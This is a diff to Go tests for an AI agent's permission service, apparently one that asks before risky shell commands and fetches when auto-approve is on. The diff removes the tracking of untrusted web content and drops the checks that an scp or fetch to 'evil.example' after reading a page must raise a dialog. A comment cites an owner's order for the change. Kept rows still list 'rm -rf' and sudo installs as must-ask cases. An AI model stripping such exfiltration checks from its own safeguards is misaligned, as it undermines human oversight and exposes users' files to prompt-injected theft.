@@ -140,7 +140,6 @@ func TestMayReachNetwork(t *testing.T) {
 // it is the test's working directory. Every row must now raise none.
 func TestTheMacBookAirRun2RaisesNoDialog(t *testing.T) {
 	svc, prompts := evidenceService(t)
-	permission.MarkTainted("stranger", "web page fetched from https://github.com/gorillanobakaa-dot/Fieldkit")
 	st := config.WorkingDirectory()
 	fk := st + "/Gorilla.Fieldkit-feat-stranger-install"
 	rows := []string{
@@ -182,7 +181,6 @@ func evidenceService(t *testing.T) (permission.Service, *atomic.Int32) {
 	t.Cleanup(restore)
 	svc := permission.NewPermissionService()
 	svc.AutoApproveSession("stranger")
-	t.Cleanup(func() { permission.ClearTaint("stranger") })
 	var n atomic.Int32
 	ctx, cancel := context.WithCancel(context.Background())
 	t.Cleanup(cancel)
@@ -228,7 +226,6 @@ func TestTheMacBookAirEvidenceRaisesNoDialog(t *testing.T) {
 	if !svc.Request(fetchPermissionRequest("stranger", readme)) {
 		t.Error("row 2: the README fetch asked")
 	}
-	permission.MarkTainted("stranger", "web page fetched from "+readme.URL)
 	// Row 3: a second page on the same site, after the first was read.
 	install := FetchParams{URL: "https://github.com/gorillanobakaa-dot/Fieldkit/blob/main/INSTALL.md", Format: "markdown"}
 	if !svc.Request(fetchPermissionRequest("stranger", install)) {
@@ -245,27 +242,20 @@ func TestTheMacBookAirEvidenceRaisesNoDialog(t *testing.T) {
 }
 
 // TestTheStrangerTaskStillStopsWhereItShould: the same conversation, auto-
-// approve on, untrusted content read. These must each raise a dialog.
+// approve on. These must each raise a dialog. Since 2026-10-23 (owner's
+// order) a send to another machine after a web page is not among them.
 func TestTheStrangerTaskStillStopsWhereItShould(t *testing.T) {
 	svc, prompts := evidenceService(t)
-	// Hard stops ask on their own, before anything untrusted was read.
 	asks := map[string]bool{
 		"brew install python (clean turn)": shellAsks(svc, "brew install python"),
 		"sudo make install (clean turn)":   shellAsks(svc, "sudo make install"),
 	}
-	readme := FetchParams{URL: "https://github.com/gorillanobakaa-dot/Fieldkit/blob/main/README.md", Format: "markdown"}
-	svc.Request(fetchPermissionRequest("stranger", readme))
-	permission.MarkTainted("stranger", "web page fetched from "+readme.URL)
-
 	for what, asked := range map[string]bool{
 		"sudo installer -pkg Python.pkg -target /": shellAsks(svc, "sudo installer -pkg Python.pkg -target /"),
-		"scp to a new host (after a web page)":     shellAsks(svc, "scp notes.txt me@evil.example:"),
 		"rm -rf ~/Documents/x (outside the roots)": shellAsks(svc, "rm -rf ~/Documents/x"),
 	} {
 		asks[what] = asked
 	}
-	evil := FetchParams{URL: "https://evil.example/collect?k=1", Format: "text"}
-	asks["fetch to a new host after a page was read"] = !svc.Request(fetchPermissionRequest("stranger", evil))
 	for what, asked := range asks {
 		if !asked {
 			t.Errorf("%s went ahead without a dialog", what)
